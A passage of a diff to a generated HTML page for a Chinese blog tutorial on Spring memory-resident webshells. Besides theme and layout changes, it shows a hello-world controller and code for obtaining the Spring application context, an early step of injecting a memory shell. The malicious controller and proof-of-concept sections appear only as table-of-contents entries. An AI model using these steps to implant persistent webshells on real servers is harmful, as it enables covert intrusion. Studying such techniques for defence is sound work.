@@ -10,7 +10,7 @@
 <meta name="description" content="Java 内存马第三篇 - Spring 内存马">
 <meta name="author" content="">
 <link rel="canonical" href="http://localhost:1313/xvsf/posts/java-%E5%86%85%E5%AD%98%E9%A9%AC%E7%AC%AC%E4%B8%89%E7%AF%87---spring-%E5%86%85%E5%AD%98%E9%A9%AC/">
-<link crossorigin="anonymous" href="http://localhost:1313/xvsf/assets/css/stylesheet.a36f6abb64fcc226df8874b18c238ad3f6f524fd452ae18a758deedcc6db1f2c.css" integrity="sha256-o29qu2T8wibfiHSxjCOK0/b1JP1FKuGKdY3u3MbbHyw=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="http://localhost:1313/xvsf/assets/css/stylesheet.efc53cc34517256b4f384fc5cd500c704131fc2e5c04a5161424931300e79a66.css" integrity="sha256-78U8w0UXJWtPOE/FzVAMcEEx/C5cBKUWFCSTEwDnmmY=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/xvsf/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/xvsf/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/xvsf/favicon-32x32.png">
@@ -70,7 +70,40 @@
         document.querySelector("html").dataset.theme = 'light';
     }
 
-</script><link rel="preload" href="http://localhost:1313/xvsf/fonts/inter-7.woff2" as="font" type="font/woff2" crossorigin>
+</script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-webfont@1.1.0/style.css" />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-lite-webfont@1.1.0/style.css" />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-tc-webfont@1.0.0/style.css" />
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lxgw-wenkai-screen-webfont@1.1.0/style.css" />
+
+
+
+<div class="progress-bar"></div>
+
+
+<script>
+document.addEventListener('DOMContentLoaded', () => {
+    const progressBar = document.querySelector('.progress-bar');
+
+    
+    const calculateScrollProgress = () => {
+        const windowHeight = window.innerHeight;
+        const documentHeight = document.documentElement.scrollHeight - windowHeight;
+        const scrollTop = window.scrollY;
+        const progress = (scrollTop / documentHeight) * 100;
+        progressBar.style.width = `${progress}%`;
+    };
+
+    
+    window.addEventListener('scroll', calculateScrollProgress);
+
+    
+    calculateScrollProgress();
+});
+</script>
 
 </head>
 <body id="top">
@@ -146,111 +179,215 @@
     <div class="post-description">
       Java 内存马第三篇 - Spring 内存马
     </div>
-    <div class="post-meta"><span title='2025-11-08 15:02:00 +0800 CST'>November 8, 2025</span>&nbsp;·&nbsp;13 min&nbsp;·&nbsp;<a href="http://localhost:1313/xvsf/categories/java%E5%AE%89%E5%85%A8/">Java安全</a>
+    <div class="post-meta"><span title='2025-11-08 15:02:00 +0800 CST'>November 8, 2025</span>&nbsp;·&nbsp;14 min&nbsp;·&nbsp;<a href="http://localhost:1313/xvsf/categories/java%E5%AE%89%E5%85%A8/">Java安全</a>
 
 </div>
-  </header> <div class="toc">
-    <details  open>
-        <summary accesskey="c" title="(Alt + C)">
-            <span class="details">Table of Contents</span>
-        </summary>
+  </header> 
 
-        <div class="inner"><ul>
-                <li>
-                    <a href="#java-%e5%86%85%e5%ad%98%e9%a9%ac%e7%ac%ac%e4%b8%89%e7%af%87---spring-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Java 内存马第三篇 - Spring 内存马">Java 内存马第三篇 - Spring 内存马</a></li>
-                <li>
-                    <a href="#%e4%b8%89spring-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="三、Spring 内存马">三、Spring 内存马</a><ul>
-                        
-                <li>
-                    <a href="#1controller-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="1、Controller 内存马">1、Controller 内存马</a><ul>
-                        
-                <li>
-                    <a href="#%e4%b8%80%e4%ba%9b%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="一些基础知识：">一些基础知识：</a><ul>
-                        
-                <li>
-                    <a href="#bean" aria-label="Bean">Bean</a></li>
-                <li>
-                    <a href="#ioc%e5%ae%b9%e5%99%a8" aria-label="IOC容器">IOC容器</a></li>
-                <li>
-                    <a href="#applicationcontext" aria-label="ApplicationContext">ApplicationContext</a></li></ul>
-                </li>
-                <li>
-                    <a href="#11-controller-%e5%88%9b%e5%bb%ba" aria-label="1.1 Controller 创建">1.1 Controller 创建</a></li>
-                <li>
-                    <a href="#12-controller-%e6%b3%a8%e5%86%8c%e6%b5%81%e7%a8%8b" aria-label="1.2 Controller 注册流程">1.2 Controller 注册流程</a></li>
-                <li>
-                    <a href="#13-%e5%86%85%e5%ad%98%e9%a9%ac%e7%bc%96%e5%86%99" aria-label="1.3 内存马编写">1.3 内存马编写</a><ul>
-                        
-                <li>
-                    <a href="#131-%e8%8e%b7%e5%8f%96%e4%b8%8a%e4%b8%8b%e6%96%87" aria-label="1.3.1 获取上下文">1.3.1 获取上下文</a><ul>
-                        
-                <li>
-                    <a href="#contextloader" aria-label="ContextLoader">ContextLoader</a></li>
-                <li>
-                    <a href="#webapplicationcontextutils" aria-label="WebApplicationContextUtils">WebApplicationContextUtils</a></li>
-                <li>
-                    <a href="#requestcontextutils" aria-label="RequestContextUtils">RequestContextUtils</a></li>
-                <li>
-                    <a href="#getattribute" aria-label="getAttribute">getAttribute</a></li>
-                <li>
-                    <a href="#%e5%8f%8d%e5%b0%84%e8%8e%b7%e5%8f%96" aria-label="反射获取">反射获取</a></li></ul>
-                </li>
-                <li>
-                    <a href="#132-%e6%b3%a8%e5%86%8c-controller" aria-label="1.3.2 注册 Controller">1.3.2 注册 Controller</a><ul>
-                        
-                <li>
-                    <a href="#registermapping" aria-label="registerMapping">registerMapping</a></li>
-                <li>
-                    <a href="#registerhandler" aria-label="registerHandler">registerHandler</a></li>
-                <li>
-                    <a href="#detecthandlermethods" aria-label="detectHandlerMethods">detectHandlerMethods</a></li></ul>
-                </li>
-                <li>
-                    <a href="#133-%e5%ae%9e%e7%8e%b0%e6%81%b6%e6%84%8f-controller" aria-label="1.3.3 实现恶意 Controller">1.3.3 实现恶意 Controller</a></li>
-                <li>
-                    <a href="#134-%e5%ae%8c%e6%95%b4-poc" aria-label="1.3.4 完整 POC">1.3.4 完整 POC</a></li>
-                <li>
-                    <a href="#%e8%ae%b0%e5%bd%95%e9%97%ae%e9%a2%98" aria-label="记录问题：">记录问题：</a></li></ul>
-                </li>
-                <li>
-                    <a href="#spring-boot-%e7%89%88%e6%9c%ac%e9%97%ae%e9%a2%98" aria-label="Spring Boot 版本问题">Spring Boot 版本问题</a></li>
-                <li>
-                    <a href="#spring-%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%85%bc%e5%ae%b9%e5%8f%af%e8%83%bd%e5%8a%a0%e4%ba%86%e6%9f%90%e4%ba%9b%e9%85%8d%e7%bd%ae%e7%b1%bb" aria-label="Spring 配置不兼容（可能加了某些配置类）">Spring 配置不兼容（可能加了某些配置类）</a></li></ul>
-                </li>
-                <li>
-                    <a href="#2interceptor-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="2、Interceptor 内存马">2、Interceptor 内存马</a><ul>
-                        
-                <li>
-                    <a href="#%e4%bb%80%e4%b9%88%e6%98%afinterceptor" aria-label="什么是Interceptor">什么是Interceptor</a></li>
-                <li>
-                    <a href="#21-interceptor-%e5%88%9b%e5%bb%ba" aria-label="2.1 Interceptor 创建">2.1 Interceptor 创建</a></li>
-                <li>
-                    <a href="#22-interceptor-%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90" aria-label="2.2 Interceptor 流程分析">2.2 Interceptor 流程分析</a></li>
-                <li>
-                    <a href="#23-%e6%b3%a8%e5%86%8c-interceptor" aria-label="2.3 注册 Interceptor">2.3 注册 Interceptor</a><ul>
-                        
-                <li>
-                    <a href="#231-%e8%8e%b7%e5%8f%96%e4%b8%8a%e4%b8%8b%e6%96%87" aria-label="2.3.1 获取上下文">2.3.1 获取上下文</a></li>
-                <li>
-                    <a href="#232-%e8%8e%b7%e5%8f%96adaptedinterceptors%e5%b1%9e%e6%80%a7%e5%80%bc" aria-label="2.3.2 获取adaptedInterceptors属性值">2.3.2 获取adaptedInterceptors属性值</a></li>
-                <li>
-                    <a href="#233-%e6%81%b6%e6%84%8f-interceptor" aria-label="2.3.3 恶意 Interceptor">2.3.3 恶意 Interceptor</a></li>
-                <li>
-                    <a href="#234-%e5%8a%a8%e6%80%81%e6%b3%a8%e5%86%8cinterceptor" aria-label="2.3.4 动态注册Interceptor">2.3.4 动态注册Interceptor</a></li>
-                <li>
-                    <a href="#235-%e5%ae%8c%e6%95%b4-poc" aria-label="2.3.5 完整 POC">2.3.5 完整 POC</a></li></ul>
-                </li></ul>
-                </li></ul>
-                </li>
-                <li>
-                    <a href="#%e5%8f%82%e8%80%83" aria-label="参考：">参考：</a>
-                </li>
-            </ul>
-        </div>
-    </details>
-</div>
+  
+  
+  <div class="post-content" style="position: relative;">
+    
+    <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">Table of Contents</span>
+            </summary>
 
-  <div class="post-content"><h1 id="java-内存马第三篇---spring-内存马">Java 内存马第三篇 - Spring 内存马<a hidden class="anchor" aria-hidden="true" href="#java-内存马第三篇---spring-内存马">#</a></h1>
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#java-%e5%86%85%e5%ad%98%e9%a9%ac%e7%ac%ac%e4%b8%89%e7%af%87---spring-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="Java 内存马第三篇 - Spring 内存马">Java 内存马第三篇 - Spring 内存马</a></li>
+                    <li>
+                        <a href="#%e4%b8%89spring-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="三、Spring 内存马">三、Spring 内存马</a><ul>
+                            
+                    <li>
+                        <a href="#1controller-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="1、Controller 内存马">1、Controller 内存马</a><ul>
+                            
+                    <li>
+                        <a href="#%e4%b8%80%e4%ba%9b%e5%9f%ba%e7%a1%80%e7%9f%a5%e8%af%86" aria-label="一些基础知识：">一些基础知识：</a><ul>
+                            
+                    <li>
+                        <a href="#bean" aria-label="Bean">Bean</a></li>
+                    <li>
+                        <a href="#ioc%e5%ae%b9%e5%99%a8" aria-label="IOC容器">IOC容器</a></li>
+                    <li>
+                        <a href="#applicationcontext" aria-label="ApplicationContext">ApplicationContext</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#11-controller-%e5%88%9b%e5%bb%ba" aria-label="1.1 Controller 创建">1.1 Controller 创建</a></li>
+                    <li>
+                        <a href="#12-controller-%e6%b3%a8%e5%86%8c%e6%b5%81%e7%a8%8b" aria-label="1.2 Controller 注册流程">1.2 Controller 注册流程</a></li>
+                    <li>
+                        <a href="#13-%e5%86%85%e5%ad%98%e9%a9%ac%e7%bc%96%e5%86%99" aria-label="1.3 内存马编写">1.3 内存马编写</a><ul>
+                            
+                    <li>
+                        <a href="#131-%e8%8e%b7%e5%8f%96%e4%b8%8a%e4%b8%8b%e6%96%87" aria-label="1.3.1 获取上下文">1.3.1 获取上下文</a><ul>
+                            
+                    <li>
+                        <a href="#contextloader" aria-label="ContextLoader"><strong>ContextLoader</strong></a></li>
+                    <li>
+                        <a href="#webapplicationcontextutils" aria-label="WebApplicationContextUtils">WebApplicationContextUtils</a></li>
+                    <li>
+                        <a href="#requestcontextutils" aria-label="RequestContextUtils"><strong>RequestContextUtils</strong></a></li>
+                    <li>
+                        <a href="#getattribute" aria-label="getAttribute"><strong>getAttribute</strong></a></li>
+                    <li>
+                        <a href="#%e5%8f%8d%e5%b0%84%e8%8e%b7%e5%8f%96" aria-label="反射获取">反射获取</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#132-%e6%b3%a8%e5%86%8c-controller" aria-label="1.3.2 注册 Controller">1.3.2 注册 Controller</a><ul>
+                            
+                    <li>
+                        <a href="#registermapping" aria-label="registerMapping">registerMapping</a></li>
+                    <li>
+                        <a href="#registerhandler" aria-label="registerHandler">registerHandler</a></li>
+                    <li>
+                        <a href="#detecthandlermethods" aria-label="detectHandlerMethods">detectHandlerMethods</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#133-%e5%ae%9e%e7%8e%b0%e6%81%b6%e6%84%8f-controller" aria-label="1.3.3 实现恶意 Controller">1.3.3 实现恶意 Controller</a></li>
+                    <li>
+                        <a href="#134-%e5%ae%8c%e6%95%b4-poc" aria-label="1.3.4 完整 POC">1.3.4 完整 POC</a></li>
+                    <li>
+                        <a href="#%e8%ae%b0%e5%bd%95%e9%97%ae%e9%a2%98" aria-label="记录问题：">记录问题：</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#spring-boot-%e7%89%88%e6%9c%ac%e9%97%ae%e9%a2%98" aria-label="Spring Boot 版本问题">Spring Boot 版本问题</a></li>
+                    <li>
+                        <a href="#spring-%e9%85%8d%e7%bd%ae%e4%b8%8d%e5%85%bc%e5%ae%b9%e5%8f%af%e8%83%bd%e5%8a%a0%e4%ba%86%e6%9f%90%e4%ba%9b%e9%85%8d%e7%bd%ae%e7%b1%bb" aria-label="Spring 配置不兼容（可能加了某些配置类）">Spring 配置不兼容（可能加了某些配置类）</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#2interceptor-%e5%86%85%e5%ad%98%e9%a9%ac" aria-label="2、Interceptor 内存马">2、Interceptor 内存马</a><ul>
+                            
+                    <li>
+                        <a href="#%e4%bb%80%e4%b9%88%e6%98%afinterceptor" aria-label="什么是Interceptor">什么是Interceptor</a></li>
+                    <li>
+                        <a href="#21-interceptor-%e5%88%9b%e5%bb%ba" aria-label="2.1 Interceptor 创建">2.1 Interceptor 创建</a></li>
+                    <li>
+                        <a href="#22-interceptor-%e6%b5%81%e7%a8%8b%e5%88%86%e6%9e%90" aria-label="2.2 Interceptor 流程分析">2.2 Interceptor 流程分析</a></li>
+                    <li>
+                        <a href="#23-%e6%b3%a8%e5%86%8c-interceptor" aria-label="2.3 注册 Interceptor">2.3 注册 Interceptor</a><ul>
+                            
+                    <li>
+                        <a href="#231-%e8%8e%b7%e5%8f%96%e4%b8%8a%e4%b8%8b%e6%96%87" aria-label="2.3.1 获取上下文">2.3.1 获取上下文</a></li>
+                    <li>
+                        <a href="#232-%e8%8e%b7%e5%8f%96adaptedinterceptors%e5%b1%9e%e6%80%a7%e5%80%bc" aria-label="2.3.2 获取adaptedInterceptors属性值">2.3.2 获取adaptedInterceptors属性值</a></li>
+                    <li>
+                        <a href="#233-%e6%81%b6%e6%84%8f-interceptor" aria-label="2.3.3 恶意 Interceptor">2.3.3 恶意 Interceptor</a></li>
+                    <li>
+                        <a href="#234-%e5%8a%a8%e6%80%81%e6%b3%a8%e5%86%8cinterceptor" aria-label="2.3.4 动态注册Interceptor">2.3.4 动态注册Interceptor</a></li>
+                    <li>
+                        <a href="#235-%e5%ae%8c%e6%95%b4-poc" aria-label="2.3.5 完整 POC">2.3.5 完整 POC</a></li></ul>
+                    </li></ul>
+                    </li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考：">参考：</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+<h1 id="java-内存马第三篇---spring-内存马">Java 内存马第三篇 - Spring 内存马<a hidden class="anchor" aria-hidden="true" href="#java-内存马第三篇---spring-内存马">#</a></h1>
 <h1 id="三spring-内存马">三、Spring 内存马<a hidden class="anchor" aria-hidden="true" href="#三spring-内存马">#</a></h1>
 <h2 id="1controller-内存马">1、Controller 内存马<a hidden class="anchor" aria-hidden="true" href="#1controller-内存马">#</a></h2>
 <h3 id="一些基础知识">一些基础知识：<a hidden class="anchor" aria-hidden="true" href="#一些基础知识">#</a></h3>
@@ -274,7 +411,43 @@
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519690.png" style="max-width: 100%; height: auto;"></p>
 <p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081519797.png" style="max-width: 100%; height: auto;"></p>
 <p>SpringController.java</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.web</span><span class="p">;</span><span class="w">
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1"> 1</a>
+</span><span class="lnt" id="2"><a class="lnlinks" href="#2"> 2</a>
+</span><span class="lnt" id="3"><a class="lnlinks" href="#3"> 3</a>
+</span><span class="lnt" id="4"><a class="lnlinks" href="#4"> 4</a>
+</span><span class="lnt" id="5"><a class="lnlinks" href="#5"> 5</a>
+</span><span class="lnt" id="6"><a class="lnlinks" href="#6"> 6</a>
+</span><span class="lnt" id="7"><a class="lnlinks" href="#7"> 7</a>
+</span><span class="lnt" id="8"><a class="lnlinks" href="#8"> 8</a>
+</span><span class="lnt" id="9"><a class="lnlinks" href="#9"> 9</a>
+</span><span class="lnt" id="10"><a class="lnlinks" href="#10">10</a>
+</span><span class="lnt" id="11"><a class="lnlinks" href="#11">11</a>
+</span><span class="lnt" id="12"><a class="lnlinks" href="#12">12</a>
+</span><span class="lnt" id="13"><a class="lnlinks" href="#13">13</a>
+</span><span class="lnt" id="14"><a class="lnlinks" href="#14">14</a>
+</span><span class="lnt" id="15"><a class="lnlinks" href="#15">15</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">com.src.springmem.demos.web</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.stereotype.Controller</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="kn">import</span><span class="w"> </span><span class="nn">org.springframework.web.bind.annotation.RequestMapping</span><span class="p">;</span><span class="w">
@@ -288,8 +461,10 @@
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">sayHello</span><span class="p">(){</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="s">&#34;hello world&#34;</span><span class="p">;</span><span class="w">
 </span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="p">}</span><span class="w">
-</span></span></span></code></pre></div><p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518537.png" style="max-width: 100%; height: auto;"></p>
+</span></span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><p><img alt="img" decoding="async" loading="lazy" src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511081518537.png" style="max-width: 100%; height: auto;"></p>
 <h3 id="12-controller-注册流程">1.2 Controller 注册流程<a hidden class="anchor" aria-hidden="true" href="#12-controller-注册流程">#</a></h3>
 <p>之前学习的 servlet、filter、listener 等都是通过访问特定路由来访问上传的内存马，那么在 Spring 中直观体现路由逻辑的就是 Controller。</p>
 <p><strong>核心请求链路:</strong></p>
@@ -372,25 +547,150 @@
 </ol>
 <h5 id="contextloader"><strong>ContextLoader</strong><a hidden class="anchor" aria-hidden="true" href="#contextloader">#</a></h5>
 <p><code>getCurrentWebApplicationContext</code> 获得的是一个 <code>XmlWebApplicationContext</code> 实例类型的 <code>Root WebApplicationContext</code>。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ContextLoader</span><span class="p">.</span><span class="na">getCurrentWebApplicationContext</span><span class="p">();</span><span class="w">
-</span></span></span></code></pre></div><h5 id="webapplicationcontextutils">WebApplicationContextUtils<a hidden class="anchor" aria-hidden="true" href="#webapplicationcontextutils">#</a></h5>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ContextLoader</span><span class="p">.</span><span class="na">getCurrentWebApplicationContext</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h5 id="webapplicationcontextutils">WebApplicationContextUtils<a hidden class="anchor" aria-hidden="true" href="#webapplicationcontextutils">#</a></h5>
 <p>通过这种方法获得的也是一个 <code>Root WebApplicationContext</code>。其中 <code>WebApplicationContextUtils.getWebApplicationContext</code> 函数也可以用 <code>WebApplicationContextUtils.getRequiredWebApplicationContext</code>来替换。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WebApplicationContextUtils</span><span class="p">.</span><span class="na">getWebApplicationContext</span><span class="p">(</span><span class="n">RequestContextUtils</span><span class="p">.</span><span class="na">getWebApplicationContext</span><span class="p">(((</span><span class="n">ServletRequestAttributes</span><span class="p">)</span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">()).</span><span class="na">getRequest</span><span class="p">()).</span><span class="na">getServletContext</span><span class="p">());</span><span class="w">
-</span></span></span></code></pre></div><h5 id="requestcontextutils"><strong>RequestContextUtils</strong><a hidden class="anchor" aria-hidden="true" href="#requestcontextutils">#</a></h5>
+<div class="code-block-container" data-expanded="true">
+    <div class="code-header">
+        <div class="mac-buttons">
+            <span class="mac-button red"></span>
+            <span class="mac-button yellow"></span>
+            <span class="mac-button green"></span>
+        </div>
+        <span class="code-language">java</span>
+        <div class="code-actions">
+            <button class="copy-btn" title="Copy">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></svg>
+            </button>
+            <button class="toggle-btn" title="Toggle">
+                <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-chevron-down"><polyline points="6 9 12 15 18 9"></polyline></svg>
+            </button>
+        </div>
+    </div>
+    <div class="code-content"><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt" id="1"><a class="lnlinks" href="#1">1</a>
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">WebApplicationContextUtils</span><span class="p">.</span><span class="na">getWebApplicationContext</span><span class="p">(</span><span class="n">RequestContextUtils</span><span class="p">.</span><span class="na">getWebApplicationContext</span><span class="p">(((</span><span class="n">ServletRequestAttributes</span><span class="p">)</span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">()).</span><span class="na">getRequest</span><span class="p">()).</span><span class="na">getServletContext</span><span class="p">());</span></span></span></code></pre></td></tr></table>
+</div>
+</div></div>
+</div><h5 id="requestcontextutils"><strong>RequestContextUtils</strong><a hidden class="anchor" aria-hidden="true" href="#requestcontextutils">#</a></h5>
 <p>通过 <code>ServletRequest</code> 类的实例来获得 <code>Child WebApplicationContext</code>。</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span><span class="w"> </span><span class="n">context</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">RequestContextUtils</span><span class="p">.</span><span class="na">getWebApplicationContext</span><span class="p">(((</span><span class="n">ServletRequestAttributes</span><span class="p">)</span><span class="n">RequestContextHolder</span><span class="p">.</span><span class="na">currentRequestAttributes</span><span class="p">()).</span><span class="na">getRequest</span><span class="p">());</span><span class="w">
